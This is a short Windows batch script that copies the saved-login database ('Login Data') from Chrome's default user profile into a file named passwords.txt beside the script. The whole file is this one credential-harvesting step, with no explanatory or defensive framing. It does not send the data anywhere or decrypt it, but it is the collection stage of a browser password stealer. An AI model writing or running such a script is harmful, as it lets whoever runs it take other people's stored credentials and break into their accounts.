@echo off
setlocal enabledelayedexpansion

set "chromeDataPath=%LocalAppData%\Google\Chrome\User Data\Default"
set "outputFile=%~dp0passwords.txt"

copy "!chromeDataPath!\Login Data" "!outputFile!" /Y
